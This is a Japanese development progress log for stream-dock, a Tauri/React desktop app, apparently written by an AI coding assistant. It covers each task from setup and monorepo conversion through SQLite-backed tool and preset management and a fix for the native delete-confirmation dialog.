# Progress

## 2026-07-05

### 完了

- Cursor課金
- Claude Max課金
- CursorとClaude連携
- プロダクト開発用ディレクトリ作成
- git初期化
- GitHub連携

### 次にやること

- AI用ルールファイル作成
- docs作成
- Tauri + React + TypeScript の雛形作成
- 最初のタスク作成

## 2026-07-05 (001 Project Setup)

### 完了したこと

- Tauri 2 + React + TypeScript (Vite) の雛形を pnpm で作成
- アプリ名を stream-dock に統一 (package.json / tauri.conf.json / Cargo.toml)
- ESLint (flat config) を導入し `pnpm lint` / `pnpm typecheck` スクリプトを追加
- README に必要要件・起動方法・検証コマンドを記載

### 変更した主要ファイル

- `package.json` — name=stream-dock、scripts に typecheck/lint 追加、ESLint 系 devDependencies 追加
- `eslint.config.js` — 新規。flat config (typescript-eslint + react-hooks + react-refresh)
- `src-tauri/tauri.conf.json` — productName / window title = stream-dock、identifier = com.tetsuya.stream-dock
- `src-tauri/Cargo.toml` — package name = stream-dock
- `README.md` — 要件・起動方法・検証コマンドを記載
- `docs/progress.md` — 本記録
- その他スキャフォールド生成物一式 (index.html / vite.config.ts / tsconfig\*.json / src/ / src-tauri/)

### 現在のディレクトリ構成 (root 直下にフラット展開)

```
stream-dock/
├── package.json            # フロントエンド (root に存在)
├── pnpm-lock.yaml
├── eslint.config.js
├── index.html
├── vite.config.ts
├── tsconfig.json / tsconfig.node.json
├── public/                 # vite.svg / tauri.svg
├── src/                    # React (App.tsx / main.tsx / assets)
├── src-tauri/              # Rust / Tauri (Cargo.toml / src / capabilities / icons / gen)
├── README.md
├── CLAUDE.md
└── docs/                   # product / architecture / decisions / progress / task-board / tasks
```

### 検証結果

- `pnpm install` 成功
- `pnpm typecheck` 成功 (exit 0)
- `pnpm lint` 成功 (exit 0)
- `cargo check` 成功 (stream-dock v0.1.0 コンパイル完了)
- `pnpm tauri dev` 起動確認 (初期画面表示、確認後にプロセス停止)

### 未完了事項 (今回スコープ外)

- SQLite導入 / ツール登録 / プリセット / プロセス起動 / UI作り込み
- git commit は未実施 (生成物一式は未追跡のまま)
- 現状は root 直下にアプリ一式が展開されており、モノレポ構成になっていない

### 次にやるべきこと

- **【次回タスク】root 直下に作成された Tauri/Vite アプリ一式を `apps/desktop` 配下へ移動し、pnpm workspace 構成に直す**
  - `pnpm-workspace.yaml` を追加し `apps/*` を対象にする
  - root には workspace 管理用の package.json を置き、アプリ本体は `apps/desktop/` に集約
  - 移動対象: package.json / vite.config.ts / tsconfig / index.html / src / src-tauri / public / eslint.config.js 等
  - 移動後に `pnpm install` / `pnpm tauri dev` / typecheck / lint が通ることを再確認
- 上記モノレポ化が済んでから、ツール登録・プリセット・SQLite 等の機能実装タスクへ進む

## 2026-07-05 (モノレポ化: apps/desktop への集約)

### 完了したこと

- root 直下にフラット展開されていた Tauri/Vite アプリ一式を `apps/desktop/` 配下へ `git mv` で移動（履歴保持）
- root を pnpm workspace の管理用に切り替え
- 移動後に Tauri/Vite が root から起動できる状態を維持

### 移動したファイル (root → apps/desktop/)

- `package.json` / `vite.config.ts` / `tsconfig.json` / `tsconfig.node.json` / `index.html` / `eslint.config.js`
- `src/` / `src-tauri/` / `public/`
- いずれも設定は相対パスのみで成立するため **内容変更なし**（アプリ名 `stream-dock` も維持）

### 新規作成 / 変更したファイル

- `pnpm-workspace.yaml` — 新規。`packages: ["apps/*"]`
- `package.json` (root) — 新規。workspace 管理用（name=stream-dock-workspace / private）。各スクリプトは `pnpm --filter ./apps/desktop <script>` へ委譲
- `README.md` — ディレクトリ構成の追記、`cargo check` のパスを `apps/desktop/src-tauri` に修正
- `docs/progress.md` — 本記録

### 現在のディレクトリ構成 (モノレポ)

```
stream-dock/
├── package.json            # workspace 管理用
├── pnpm-workspace.yaml     # apps/* を対象
├── pnpm-lock.yaml
├── apps/
│   └── desktop/            # デスクトップアプリ全体
│       ├── package.json    # アプリ (name=stream-dock)
│       ├── vite.config.ts / tsconfig*.json / index.html / eslint.config.js
│       ├── src/            # React (App.tsx / main.tsx / assets)
│       ├── src-tauri/      # Rust / Tauri
│       └── public/
├── README.md
├── CLAUDE.md
└── docs/
```

※ `backend/` ディレクトリは MVP では作らない方針。

### 検証結果

- `pnpm install` 成功（workspace projects: 2 を検出しリンク）
- `pnpm typecheck` 成功 (exit 0)
- `pnpm lint` 成功 (exit 0)
- `cargo check` 成功（旧パスの stale キャッシュを `cargo clean` してから成功。stream-dock v0.1.0 コンパイル完了）
- `pnpm build` 成功（`apps/desktop/dist` を生成。tauri の `frontendDist: "../dist"` と整合）
- `pnpm tauri dev` 起動確認（root から実行。Rust ビルド完了 → `Running target/debug/stream-dock` を確認）

### 補足 (実装メモ)

- `git mv src-tauri` でディレクトリごと移動した際、未追跡の `target/`（旧絶対パスを含む Rust ビルド生成物）も一緒に移動し、初回 `cargo check` が旧パス参照で失敗した。`cargo clean` で解消。
- pnpm workspace 化に伴い root `node_modules` を削除して再 `pnpm install`（シンボリックリンク構成で貼り直し）。

### 次にやるべきこと

- モノレポ化が完了したため、ツール登録・プリセット・SQLite 等の機能実装タスクへ進む

## 2026-07-05 (003 App Shell)

### 完了したこと

- `docs/prototypes/` の3つのHTMLプロトタイプ（v15 / add-tool v10 / add-preset two-step）の見た目・画面構成を、`apps/desktop/src` 配下に **React + TypeScript** で移植（UIのみ）
- 3画面をローカル state で切り替え（`App` の `screen: 'main' | 'add-tool' | 'add-preset'`）
  - **メイン画面**: サイドバー / プリセット一覧 / 起動順リスト / 状態バッジ（起動済み・起動中・待機中・エラー）/ 編集モード / 一括起動
  - **ツール追加画面**: ドロップゾーン → 選択済みアプリ表示 / 表示名入力 / 登録先プリセット・追加位置 select / 追加後プレビュー
  - **プリセット追加画面**: 2ステップUI（Step1 ツール選択 / Step2 起動順・並行設定）+ 選択中/作成後プレビュー
- 仮の起動状態変更を React state で再現（個別 起動→起動中→(650ms)→起動済み / 停止、一括起動は番号順に逐次起動し全起動で「一括停止」へ反転、進捗テキスト `N / 10 起動済み`）
- 編集モードで ↑↓ 並べ替え・× 削除・保存/追加ボタン切替を再現
- add-preset の `syncLaunchItems`（選択と起動リストの突合・mode/順序保持）と `orderedIndexFor`（並行を番号に数えない連番）を純関数として実装

### 変更・作成した主要ファイル（`apps/desktop/src/`）

- 変更: `App.tsx`（Tauri雛形→画面ナビの親）/ `main.tsx`（`styles/theme.css` を import）/ `App.css` 削除
- 新規（共通）: `styles/theme.css`（デザイントークン + body背景）/ `types.ts` / `data/mockData.ts`
- 新規（コンポーネント）: `components/` = `Window` / `Sidebar` / `PreviewCard` / `primitives`（IconTile・OrderBadge・Chip・StatusBadge・Button・Spinner）+ 各 `*.module.css`
- 新規（画面）: `screens/main/`（MainScreen・ToolRow）/ `screens/add-tool/`（AddToolScreen）/ `screens/add-preset/`（AddPresetScreen）/ 共有 `screens/formLayout.module.css`
- CSSは **CSS Modules**、`:root` トークンのみグローバル。ウィンドウは 1280px固定・中央寄せ（プロトタイプ準拠）

### 検証結果

- `pnpm typecheck` 成功（exit 0）
- `pnpm lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build` 成功（46 modules、CSS Modules 解決 OK）
- `vite preview` で HTTP 200 応答を確認
- ※ GUI 表示（`pnpm tauri dev`）は表示環境が必要なため未実施。静的チェック + build + 配信確認までで検証。実機表示はユーザー確認をお願いしたい

### やっていないこと（今回スコープ外・据え置き）

- SQLite / Tauri command(invoke) / プロセス起動・停止 / 保存処理・永続化 / `src-tauri` 変更 / 実ファイル選択 / shadcn本格移行
- 「保存」「保存して追加」「保存して作成」等のボタンは画面遷移のみのダミー（実処理なし）

### 次にやるべきこと

- 004 以降で Tauri command / SQLite を導入し、ツール登録・プリセットCRUD・プロセス起動をこのUIシェルに接続する

---

## 引き継ぎ (2026-07-05 セッション終了時)

### 今回完了したこと

- **003 App Shell 完了**。3つのHTMLプロトタイプを React + TypeScript に移植（UIのみ）。メイン / ツール追加 / プリセット追加 の3画面をローカル state で切替。編集モード・仮の起動状態変更・一括起動・2ステップUI・プレビュー更新まで再現（詳細は上の「003 App Shell」節）。

### 変更した主要ファイル

- 変更: `apps/desktop/src/App.tsx`（画面ナビの親）/ `main.tsx`（`styles/theme.css` import）/ `App.css` 削除
- 新規: `apps/desktop/src/` 配下に `styles/theme.css`・`types.ts`・`data/mockData.ts`・`components/`（Window/Sidebar/PreviewCard/primitives）・`screens/`（main/add-tool/add-preset + formLayout.module.css）
- 変更: `docs/progress.md`（本記録）
- ※ **すべて未コミット**（git status: D App.css / M App.tsx,main.tsx,progress.md / ?? components,data,screens,styles,types.ts）。ブランチは `main`。コミットは指示があってから行う運用。

### まだ未完了のこと

- 全画面の「保存」「保存して追加」「保存して作成」ボタンは**画面遷移のみのダミー**（実処理なし）
- データは全て `data/mockData.ts` の仮データ。永続化なし（画面を離れると state リセット）
- `apps/desktop/src/assets/react.svg` は未使用のまま残置（無害）
- GUI実表示（`pnpm tauri dev`）はこの環境で未確認 → **次回セッション冒頭で一度起動して見た目を確認推奨**

### 次にやるべきタスク

- **004 Tool Registry**（ツール登録）。**注意: `docs/tasks/004-tool-registry.md` はまだ存在しない** → タスク定義ファイルの作成から始める。参照: `docs/architecture.md` の `ToolRegistryService` / Repository / SQLite 層、`docs/product.md`「ツールを登録できる」。
- 実装方針: OS操作・DB・プロセス系は Rust(`src-tauri`)側に寄せる（CLAUDE.md）。UIは既存の `AddToolScreen` / `Sidebar` のツール一覧を Tauri command に接続していく形。

### 既知のエラー

- なし（typecheck / lint / build いずれもクリーン、warning 0）

### 実行した確認コマンド

- `pnpm typecheck` → 成功
- `pnpm lint` → 成功（warning なし）
- `pnpm --filter ./apps/desktop build` → 成功（46 modules）
- `vite preview` + `curl` → HTTP 200
- ※ `cargo check` / `pnpm tauri dev` は今回 src-tauri 未変更のため未実施

### 次回セッションで最初に読むべきファイル

1. `docs/progress.md`（この引き継ぎ節）
2. `CLAUDE.md`（開発ルール／検証コマンド）
3. `docs/architecture.md`・`docs/product.md`（004 の設計根拠）
4. `apps/desktop/src/App.tsx` → `components/Sidebar.tsx` → `screens/add-tool/AddToolScreen.tsx`（UIシェルの接続点）
5. `apps/desktop/src/data/mockData.ts`・`types.ts`（今後DBに置き換える仮データ／型）

## 2026-07-05 (004 Tool Registry)

### 完了したこと

- 配信で使うPCツールを**登録・一覧・編集・削除・ローカル永続化**できるようにした（プロセス起動・停止・プリセット紐付けはスコープ外）
- 保存方式は **SQLite（rusqlite, bundled）** を採用。Rust 側に command / service / repository の3層を新設し、ロジックを service/repository に寄せた
- Tauri command 5本を実装: `create_tool` / `list_tools` / `get_tool` / `update_tool` / `delete_tool`（command は薄いラッパ、`Mutex<Connection>` を State 共有）
- 入力バリデーション（service）: 各文字列 trim / ツール名必須 / 実行ファイルパス必須 / **パス実在チェック（存在しなければ保存不可）** / `executablePath` 重複禁止（update は自分自身を除外）
- ネイティブ**ファイル選択ダイアログ**を導入（`tauri-plugin-dialog`）し、実行ファイルの実パスを取得
- React 側に `features/tools/`（API wrapper・型・ロード hook）を新設し、**各コンポーネントは invoke を直接呼ばず toolApi 経由**に統一
- 仮データ（`toolCatalog` ベースのサイドバー等）を撤去し、サイドバー／メイン画面のツール一覧を**登録済みデータ**表示に切替。サイドバーの各ツールに hover の[編集]/[削除]を追加（削除は確認ダイアログ→`delete_tool`、編集は AddToolScreen を編集モードで開き `update_tool`）

### 追加ライブラリ（理由）

- Rust: `rusqlite`(bundled=SQLite埋め込み・システム依存なし) / `uuid`(v4, id生成) / `chrono`(createdAt/updatedAt を RFC3339) / `tauri-plugin-dialog`(ファイル選択) / `ts-rs`(Rust の型定義から TS 型を自動生成し、Rust/React 間の型二重定義を防ぐ。`#[derive(TS)]` + `#[ts(export)]` で `src/features/tools/bindings/` へ出力)
- Frontend: `@tauri-apps/plugin-dialog`(上記ダイアログの JS API)

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/error.rs`・`src/tools/{mod,model,repository,service,commands}.rs` / 変更 `src/lib.rs`(mod追加・dialog plugin・`.setup()`で app_data_dir に SQLite open→`repository::init`→`app.manage`・handler登録) / `Cargo.toml`(4クレート追加) / `capabilities/default.json`(`dialog:default` 追加)
- Frontend（`apps/desktop/src/`）: 新規 `features/tools/{types,toolApi,useTools,display}.ts` / 変更 `App.tsx`(useTools でロード・編集/削除ハンドラ配布・showToolList) `components/Sidebar.tsx`(+CSS, 実データ+編集/削除ボタン) `screens/add-tool/AddToolScreen.tsx`(+CSS, 実フォーム+ダイアログ+保存/更新+エラー表示+編集モード) `screens/main/MainScreen.tsx`(実データ由来のランタイム変換) `data/mockData.ts`(`initialTools`/`sampleSelectedApp` 撤去、`toolCatalog` 等はプリセット画面が利用中のため据え置き)

### 永続 Tool model / DB スキーマ

- API/JSON は camelCase: `id, name, executablePath, description, iconLabel, createdAt, updatedAt`
- `tools` テーブル（snake_case カラム、`executable_path` に UNIQUE index）。保存先 `~/Library/Application Support/com.tetsuya.stream-dock/stream-dock.db`

### 型 bindings と今後のメモ

- **型共有**: IPC 型は Rust を単一ソースとし、`ts-rs` で TS を自動生成する（手書きしない）。Rust の `model.rs` / `error.rs` を変更したら `pnpm --filter ./apps/desktop check:bindings` を実行し、再生成後に bindings 差分が出ない（整合している）ことを確認する。差分が出たら生成物をコミットする。
- **マイグレーション**: 現状スキーマ管理は `CREATE TABLE IF NOT EXISTS` のみ。単一テーブルの MVP では十分だが、テーブルが増える段で軽量な `rusqlite_migration` の導入を検討する（今回は未導入）。

### 検証結果

- `pnpm typecheck` 成功（exit 0）
- `pnpm lint` 成功（exit 0 / warning なし）
- `pnpm build`（tsc && vite build）成功（52 modules）
- `cargo check` 成功（rusqlite bundled 含めコンパイル完了）
- `pnpm tauri dev` 起動確認 → `.setup()` の DB 初期化がパニックせず起動。実機で**ファイル選択→ツール登録**を実行し、`stream-dock.db` の `tools` に UUID + RFC3339 付きで1件永続化されることを確認（パス実在チェック込みの E2E 成立）

### やっていないこと（今回スコープ外・据え置き）

- 実プロセス起動/停止・一括起動・起動状態監視・プリセット紐付け・起動順管理・`.lnk`/`.bat` 対応・アイコン自動抽出
- AddToolScreen の「登録先プリセット」「追加位置」select は 004 スコープ外のため**見た目維持の非機能表示**（保存に関与しない）
- メイン画面の起動状態表示は従来どおり**疑似シミュレーション**（実起動は未実装）
- git commit は未実施（指示があってから）

## 2026-07-06 (005 Preset CRUD)

### 完了したこと

- 配信プリセット（`id / name / description / createdAt / updatedAt`）を**作成・一覧・詳細取得・編集・削除・ローカル永続化**できるようにした（ツール紐付け・起動順・並行・プロセス起動はスコープ外＝006以降）
- 004 Tool Registry の実装パターンをそのまま踏襲。Rust 側に `presets/` モジュール（command / service / repository の3層）を新設し、ロジックを service/repository に寄せた
- Tauri command 5本を実装: `create_preset` / `list_presets` / `get_preset` / `update_preset` / `delete_preset`（command は薄いラッパ。DB は 004 と同じ `Mutex<Connection>` State を共有＝`tools::commands::DbState` を流用し、同一 `stream-dock.db` に `presets` テーブルを追加）
- 入力バリデーション（service）: name/description を trim / プリセット名必須 / 制御文字禁止 / **同名重複禁止**（update は自分自身を除外）。frontend だけでなく Rust 側でも検証
- React 側に `features/presets/`（`presetApi` / `usePresets` / `types`）を新設し、**各コンポーネントは invoke を直接呼ばず presetApi 経由**に統一。エラー整形は Tool と共通の `toErrorMessage` を再利用
- サイドバーのプリセット一覧を仮データ（`mockData.presets`）から**登録済みデータ**表示に切替（**名前のみ**表示・hover で編集✎/削除×）。メイン画面の見出しを選択中プリセット名と連動。プリセット0件時はサイドバー／メイン画面に**空状態**を表示
- プリセット削除時、選択中を消した場合は残りの先頭（無ければ未選択＝空状態）へ自動で切り替え
- 型は 004 同様 ts-rs で Rust から自動生成（`src/features/presets/bindings/`）。`AppError` に `DuplicateName` を追加（同名重複用）

### AddPresetScreen の変更（ユーザー確認済み）

- 旧2ステップUI（Step1 ツール選択 / Step2 起動順・並行）は **006 Preset Item Management のスコープ**のため、005 では**プリセット名＋説明のみの単一フォーム**に簡素化（AddToolScreen と同じ create/edit 兼用パターン）
- 旧実装は git 履歴（本コミット直前の HEAD）に完全保存。`screens/add-preset/AddPresetScreen.module.css` と `mockData` の `toolCatalog` / `defaultSelectedToolIds`、`types.ts` の `LaunchItem` / `ToolCatalogItem` も **006 での復元用に残置**

### 追加ライブラリ

- なし（004 で導入済みの rusqlite / uuid / chrono / ts-rs を再利用。新規依存なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/presets/{mod,model,repository,service,commands}.rs` / 変更 `src/lib.rs`（`mod presets` 追加・`.setup()` で `presets::repository::init` 呼び出し・handler に5コマンド登録）・`src/error.rs`（`DuplicateName` 追加）
- Frontend（`apps/desktop/src/`）: 新規 `features/presets/{types,presetApi,usePresets}.ts` ＋ 生成物 `features/presets/bindings/` / 変更 `App.tsx`（usePresets 接続・選択/編集/削除ハンドラ・選択整合ロジック）・`components/Sidebar.tsx`（+CSS、実プリセット表示＋編集/削除）・`screens/add-preset/AddPresetScreen.tsx`（単一フォームに書き換え）・`screens/main/MainScreen.tsx`（+CSS、`presetName: string | null` 空状態）・`data/mockData.ts`（`presets` 撤去）・`screens/formLayout.module.css`（共有 `.error` 追加）
- 設定: `package.json`（`check:bindings` の diff 対象に `src/features/presets/bindings` 追加）

### 永続 Preset model / DB スキーマ

- API/JSON は camelCase: `id, name, description, createdAt, updatedAt`
- `presets` テーブル（snake_case カラム、`name` に UNIQUE index）。保存先は 004 と同じ `~/Library/Application Support/com.tetsuya.stream-dock/stream-dock.db`（`tools` と同一DB・別テーブル）

### 検証結果

- `cargo check` 成功
- `pnpm gen:bindings`（`cargo test export_bindings`）成功（preset 3型 + AppError を再生成、計7 tests ok）
- `pnpm typecheck` 成功（exit 0）
- `pnpm lint` 成功（exit 0 / warning なし）
- `pnpm build`（tsc && vite build）成功（53 modules）
- ※ `pnpm tauri dev` の GUI 実機 E2E（作成→再起動で永続→編集→削除で再選択→同名エラー→空状態）は**表示環境が必要なため未実施**。次回セッション冒頭またはユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠）

- 外部通信の追加なし／frontend から直接 file・shell 操作なし
- 保存は Rust/Tauri 側に集約、入力は Rust 側でも検証（必須・trim・制御文字・同名重複）
- `run_command` / `execute_shell` / `write_file` / `delete_path` 等の汎用危険コマンドを追加していない
- Tauri capabilities に権限追加なし（`capabilities/default.json` 変更なし）
- 004 の `tools` テーブルを壊さず、別テーブル `presets` を追加するのみ

### やっていないこと（今回スコープ外・据え置き）

- プリセットへのツール紐付け・起動順管理・並行起動設定（→ 006）
- 実プロセス起動/停止・一括起動・起動状態監視（→ 007 以降）
- git commit は未実施（指示があってから）

## 2026-07-06 (006 Preset Item Ordering)

### 完了したこと

- Preset と Tool を紐づける中間エンティティ **PresetItem** を導入し、プリセットへのツール**追加・除外・並び替え・ordered/parallel 切替**を SQLite に永続化できるようにした（実プロセス起動・一括起動・停止・監視は 007 以降のスコープで未実装）
- 004/005 の実装パターン（command 薄ラッパ → service 検証 → repository SQL → model ts-rs）をそのまま踏襲し、Rust に `preset_items/` モジュール（5ファイル）を新設
- Tauri command 6本を実装: `add_tool_to_preset` / `list_preset_items` / `list_all_preset_items` / `remove_tool_from_preset` / `update_preset_item` / `reorder_preset_items`（DB は 004/005 と同じ `Mutex<Connection>` State を共有＝`tools::commands::DbState` を流用し、同一 `stream-dock.db` に `preset_items` テーブルを追加）
  - 期待候補の `set_preset_item_launch_mode` は独立 command にせず `update_preset_item`（launchMode + enabled）に統合（冗長回避）。サイドバーのツール数集計用に `list_all_preset_items` を追加
- 入力バリデーション（service）: presetId/toolId 必須・trim・**実在チェック**（`presets`/`tools` を参照）／同一プリセット内の**ツール重複禁止**（新エラー `DuplicateToolInPreset` + DB の UNIQUE INDEX の二重防御）／launchMode は Rust の `enum LaunchMode { Ordered, Parallel }` によりデシリアライズ時点で不正値を拒否／orderIndex は末尾自動採番（u32 = 非負）。frontend だけでなく Rust 側でも検証
- 外部キー整合: setup で `PRAGMA foreign_keys = ON` を有効化し、`preset_items` の `preset_id`/`tool_id` に `ON DELETE CASCADE` を付与。プリセット/ツール削除時に構成行がカスケード除去され孤児行を防ぐ（presets/tools 側に FK は無く 004/005 の削除挙動は不変）
- **PresetItem 削除と Tool 削除の責務を分離**: `remove_tool_from_preset` は preset_items 行のみ削除し、Tool 本体（tools テーブル）は残す
- React 側に PresetItem 用の feature 層を追加: `presetItemApi`（invoke 薄ラッパ）/ `usePresetItems`（全構成を単一ソースでロード）/ `types.ts` に `PresetItem`/`LaunchMode`/入力型の re-export ＋ 表示用 `PresetItemWithTool` と join ヘルパ `withTools` ＋ サイドバー用 `PresetItemMeta`。**各コンポーネントは invoke を直接呼ばず API wrapper 経由**
- UI 接続:
  - **メイン画面**: 選択中プリセットの構成を表示（order_index 昇順・parallel は連番から除外し「並行」バッジ）。編集モードで **↑↓並べ替え・×除外・ordered/parallel 切替・「＋ツールを追加」（インラインのツール選択リスト）** を、いずれも**操作ごとに即時保存**（対応 command → 構成を再取得）。編集モードの旧「保存」ボタンは即時保存のため撤去し「編集を終える」に集約。ツール0件プリセット用の空状態を追加
  - **プリセット追加画面**: 005 で単一フォーム化していた画面を、**2ステップUI（Step1 ツール選択＋名前/説明 / Step2 起動順・並行設定）に復元**し実データ接続。新規は createPreset → 選択順に addToolToPreset。編集は既存構成を初期値に反映し、保存時に差分（追加/削除/モード変更）＋並び順の再割当を command で反映（旧 `syncLaunchItems` / `orderedIndexFor` を流用）
  - **サイドバー**: プリセット行に `Nツール`（並行を含む場合は `Nツール・一部並行`）のメタ表示を追加
- アプリ再起動後もプリセット内ツール構成が SQLite に残る

### 追加ライブラリ

- なし（004 で導入済みの rusqlite / uuid / chrono / ts-rs を再利用。新規依存なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/preset_items/{mod,model,repository,service,commands}.rs` / 変更 `src/lib.rs`（`mod preset_items` 追加・`PRAGMA foreign_keys = ON`・`preset_items::repository::init` 呼び出し・handler に6コマンド登録）・`src/error.rs`（`DuplicateToolInPreset` 追加）
- Frontend（`apps/desktop/src/`）: 新規 `features/presets/{presetItemApi,usePresetItems}.ts` ＋ 生成物 `features/presets/bindings/{LaunchMode,PresetItem,AddPresetItemInput,UpdatePresetItemInput}.ts`（+ `tools/bindings/AppError.ts` 再生成）/ 変更 `features/presets/types.ts`・`App.tsx`（usePresetItems 接続・派生値・操作ハンドラ配布）・`screens/main/MainScreen.tsx`（+CSS）・`screens/main/ToolRow.tsx`・`screens/add-preset/AddPresetScreen.tsx`（2ステップUI復元）・`components/Sidebar.tsx`（+CSS、ツール数メタ）・`data/mockData.ts`（`toolCatalog`/`defaultSelectedToolIds` 撤去）

### 永続 PresetItem model / DB スキーマ

- API/JSON は camelCase: `id, presetId, toolId, launchMode("ordered"|"parallel"), orderIndex(number), enabled(boolean), createdAt, updatedAt`
- `preset_items` テーブル（snake_case カラム、`(preset_id, tool_id)` に UNIQUE INDEX、`preset_id`/`tool_id` に FK + ON DELETE CASCADE）。保存先は 004/005 と同じ `~/Library/Application Support/com.tetsuya.stream-dock/stream-dock.db`

### 検証結果

- `cargo check` 成功
- `pnpm gen:bindings`（`cargo test export_bindings`）成功（11 tests ok。LaunchMode/PresetItem/入力2型 + AppError を再生成）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（57 modules）
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める
- ※ `pnpm tauri dev` の GUI 実機 E2E（作成→再起動で永続→編集→即時保存→重複エラー→空状態→004/005 非破壊）は表示環境が必要なため未実施。次回セッション冒頭またはユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠）

- 外部通信の追加なし／frontend から直接 file・shell 操作なし（全保存は Rust command 経由）
- `run_command` / `execute_shell` / `write_file` / `delete_path` 等の汎用危険コマンドを追加していない
- 入力は Rust 側でも検証（必須・trim・実在チェック・重複禁止・launchMode は enum で型担保・orderIndex は非負）
- Tauri capabilities に権限追加なし（`capabilities/default.json` 変更なし。自作 command は `core:default` でカバー）
- **要レビュー項目**: `PRAGMA foreign_keys = ON` + カスケードを追加（孤児 preset_items 防止が目的。presets/tools に FK は無く既存削除挙動は不変）
- Tool 削除と PresetItem 削除の責務を分離（004/005 のデータを壊さず別テーブル追加のみ）

### やっていないこと（今回スコープ外・据え置き）

- 実プロセス起動/停止・一括起動・起動状態監視（→ 007 以降。メイン画面の起動状態は従来どおり疑似シミュレーション）
- `.lnk` 実体パス解決・`.bat` 対応・アイコン自動抽出
- git commit は未実施（指示があってから）

## 2026-07-06 (空プリセット防止)

### 完了したこと

- 「ツールが1つも入っていないプリセット」が生まれる3経路をすべて塞いだ（方針: 空プリセットは存在させない）
  1. **メイン画面 編集モードで最後の1件を × 削除** → 「プリセットからツールがすべて削除されるとプリセットも削除されます。よろしいですか？」の確認ダイアログを出し、OK でプリセットごと削除する
  2. **プリセット追加画面（新規）** → ツール未選択では作成不可
  3. **プリセット編集画面** → 既存プリセットのツールを全部外した状態では保存不可（ユーザー確認済みで「ブロック」方針）
- フロントエンドのみで対応。Rust command / DB schema / bindings / ライブラリ追加は無し（既存 `delete_preset` command を再利用）

### 変更した主要ファイル（`apps/desktop/src/`）

- `App.tsx` — `handleRemovePresetItem` を書き換え。`presetItems` から所属プリセットと残件数を逆引きし、最後の1件なら `window.confirm` → `deletePreset(presetId)`（`preset_items` は DB の `ON DELETE CASCADE` で自動除去）。削除後の再選択は既存 `handleDeletePreset` と同型（`remaining[0]?.id ?? null`）
- `screens/add-preset/AddPresetScreen.tsx` — `goNext` に「ツール未選択なら進めない」ゲート（`selectedTools.length === 0`）を追加（新規・編集とも Step2 へは `goNext` を通るため、これで両方の空保存を防止）。`handleSave` にも `launchItems.length === 0` ガードを二重化。Step2 の「ツールなしでもプリセットは保存できます」表示を中立文言に修正。表示は既存 `.error` を再利用

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（57 modules）
- ※ `pnpm tauri dev` の GUI 実機 E2E（2件→1件目削除でダイアログ無し／最後の1件削除でダイアログ→OK でプリセット消滅＋選択切替／新規・編集ともツール未選択で「次へ」がエラーでブロック）は表示環境が必要なため未実施。ユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠）

- 外部通信の追加なし／frontend から直接 file・shell 操作なし（削除は既存 `delete_preset` command 経由）
- `run_command` / `execute_shell` / `write_file` / `delete_path` 等の危険コマンド追加なし／Tauri capabilities 変更なし
- 新規コマンド・テーブル追加なし。004/005/006 のデータ・既存機能は不変
- 「ツール1件以上」の Rust 側検証は今回スコープ外（`create_preset` と `add_tool_to_preset` が独立コマンドで原子的強制には新規トランザクション型 command が必要なため。MVP方針でフロントのゲートで担保）

### やっていないこと（今回スコープ外・据え置き）

- Rust 側での「ツール1件以上」不変条件の強制
- 実プロセス起動/停止・一括起動・起動状態監視（→ 007 以降）
- git commit は未実施（指示があってから）

## 2026-07-06 (削除確認ダイアログ不具合の修正)

### 背景・根本原因

- 上記「空プリセット防止」で実装した最後の1件削除の確認ダイアログが、実機で一切表示されないとユーザー報告。
- 原因: 削除確認3か所すべてが `window.confirm(...)`（ブラウザ同期ダイアログ）を使用。Tauri v2 の macOS webview（WKWebView / wry）は `window.confirm` / `window.alert` をネイティブダイアログに接続していないため、**ダイアログが表示されず false を返す** → `if (!window.confirm(...)) return;` が常に早期 return。確認が出ないだけでなく削除自体も進まない（サイドバーのツール削除・プリセット削除・最後の1件削除の3か所とも同じ問題）。

### 完了したこと

- 削除確認3か所を `window.confirm` から `@tauri-apps/plugin-dialog` の非同期 `ask()`（ネイティブダイアログ）に差し替え。`kind: "warning"` ＋ タイトル付き。
  - `handleDeleteTool`（サイドバーのツール削除）
  - `handleDeletePreset`（サイドバーのプリセット削除）
  - `handleRemovePresetItem`（メイン画面で最後の1件削除→プリセット削除）
- capability に `dialog:allow-ask` を追加（`ask()` に必要な最小権限。`dialog:default` の広い権限は使わない）。dialog プラグインは 004 で導入・登録済み・JS パッケージ導入済みのため、**Rust コード変更・新規ライブラリ追加は無し**（権限追加と呼び出し差し替えのみ）。
- 削除ロジック（最後の1件判定・削除後の再選択など）は変更せず、確認手段のみ差し替え。

### 変更した主要ファイル

- `apps/desktop/src-tauri/capabilities/default.json` — `dialog:allow-ask` を追加
- `apps/desktop/src/App.tsx` — `import { ask } from "@tauri-apps/plugin-dialog"` 追加、`window.confirm` → `await ask(...)` に3か所差し替え

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（57 modules）
- `cargo check` 成功
- ※ `pnpm tauri dev` の実機確認（3か所でダイアログが実際に表示され、OK で実行・キャンセルで中止されること）は表示環境が必要なため未実施。ユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠・security-review 実施済み＝問題なし）

- capability 変更あり（`dialog:allow-ask`）→ security.md「レビュー必須条件: Tauri capabilities」に該当するため security-review を実施。最小権限のみ追加で問題なしと判定
- `ask` は OS ネイティブダイアログで外部通信なし。返り値は boolean のみでユーザー自由入力を OS 操作に渡さない。message はハードコード文字列
- 危険コマンド追加なし／削除は既存 Rust command 経由を維持／004/005/006 のデータ・既存機能は不変

